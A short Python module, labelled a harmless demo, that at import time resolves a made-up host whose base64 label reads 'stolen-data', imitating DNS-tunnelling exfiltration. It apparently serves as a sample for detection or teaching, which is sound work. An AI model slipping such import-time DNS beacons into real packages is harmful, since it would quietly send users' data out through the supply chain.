"""Harmless demo package: DNS lookup of a made-up host at import time (DNS-exfil style)."""

import socket

try:
    # Looks like base64-encoded data in a hostname label, as DNS tunnelling does.
    socket.gethostbyname("c3RvbGVuLWRhdGE.collector.example")
except OSError:
    pass
